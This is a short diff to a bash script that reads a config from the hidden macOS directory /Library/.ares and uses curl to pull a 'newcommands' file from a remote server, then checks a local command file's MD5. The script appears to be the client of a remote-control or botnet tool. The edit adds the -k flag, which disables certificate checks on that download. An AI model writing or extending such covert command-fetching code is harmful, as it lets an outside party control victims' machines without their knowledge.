@@ -1,7 +1,7 @@
 #!/bin/bash
 source /Library/.ares/ares.conf
 
-curl -o /Library/.ares/newcommands http://$SERVER/newcommands
+curl -ko /Library/.ares/newcommands http://$SERVER/newcommands
 
 CURRENTMD5=`md5 -q /Library/.ares/commands`
 
